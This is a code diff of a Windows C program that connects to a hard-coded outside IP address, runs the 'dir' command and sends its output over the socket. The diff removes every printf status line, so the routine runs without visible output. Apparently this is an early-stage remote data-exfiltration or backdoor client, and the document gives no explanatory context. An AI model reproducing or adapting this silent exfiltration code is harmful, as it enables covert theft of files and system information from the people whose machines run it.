@@ -18,10 +18,10 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
     {
         hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (hSocket==INVALID_SOCKET){
-            printf("Socket failed\n");
+            
         }
         else{
-            printf("Socket Launched\n");
+            
             
             sockAddr.sin_family = AF_INET;
 
@@ -30,21 +30,21 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
             sockAddr.sin_addr.S_un.S_addr = inet_addr("80.112.129.129");
             
             if (connect(hSocket, (SOCKADDR*)(&sockAddr), sizeof(sockAddr))!=0){
-                printf("Could not connect.\n");
+                
             }else{
-                printf("Connected!\n");
+                
                 FILE* commText = popen("dir","r");
                 if (commText != NULL){
                     while(fgets(MSG, sizeof(MSG), commText) != NULL){
-                        printf("sizeof:%d strlen:%d",sizeof(MSG),strlen(MSG));
+                        
                         if (send(hSocket, MSG, strlen(MSG), 0) == SOCKET_ERROR){
-                            printf("Could not send\n");
+                            
                         }else{
-                            printf("Data sent!\n");
+                            
                         }
                     }
                 }else{
-                    printf("Could not popen.\n");
+                    
                 }
                 pclose(commText);
             }
@@ -54,18 +54,18 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
     }
     else
     {
-        printf("Required version not available\n");
+        
     }
 
     // Cleanup winsock
     if (WSACleanup()!=0)
     {
-        printf("cleanup failed\n");
+        
     }
 }
 else
 {
-    printf("startup failed\n");
+    
 }
 return 0;
 }
